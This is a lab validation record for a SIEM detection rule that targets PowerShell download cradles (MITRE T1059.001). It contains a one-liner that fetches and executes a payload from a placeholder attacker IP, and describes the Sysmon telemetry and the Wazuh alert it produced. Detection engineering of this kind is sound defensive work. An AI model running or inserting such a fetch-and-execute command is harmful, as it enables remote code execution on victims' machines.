# T1059.001 — PowerShell Download Cradle

Validates: [DET-003](../flagships/f1-detection-pipeline/docs/detections/det-003-powershell-download-cradle.md)
(Wazuh custom 100004). See also
[DET-002](../flagships/f1-detection-pipeline/docs/detections/det-002-powershell-encoded-command.md)
(custom 100005, encoded command) — same technique, different execution
pattern, validated separately.

## Commands

Hosted a benign text payload on the Parrot attacker box (simple HTTP
server), then ran a download-cradle one-liner on `windows-victim`:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://<attacker-ip>:8000/payload.txt')
```

## Expected telemetry

Sysmon EID 1 (`process_creation`) with `Image` ending `\powershell.exe`
and `CommandLine` containing both a download primitive
(`DownloadString`/`Net.WebClient`) and an execution primitive
(`Invoke-Expression`/`IEX`) in the same line.

## Rules fired

- Custom Wazuh rule 100004 `CTUM: PowerShell download cradle - fetch and
  execute pattern [T1059.001]`, level 10.

## Cleanup

None required — the served payload was inert text, no persistence or
follow-on execution.

## Evidence

- `shared/evidence/det003-rule100004-alert.png` — SIEM view, rule 100004
  firing on `windows-victim` at 2026-09-27 18:51:56.
- Attack-view screenshot (the cradle command itself) still to capture —
  see `shared/evidence-index.md`.

## Notes

Distinguishing note vs. DET-002: this rule specifically targets the
fetch-and-execute-in-one-line cradle pattern (attacker infra actively
serving payload), whereas DET-002 (100005) targets `-EncodedCommand`
usage, which is typically a pre-staged/obfuscated payload rather than a
live fetch. Both are T1059.001 but represent different attacker
tradecraft and are kept as separate rules deliberately.
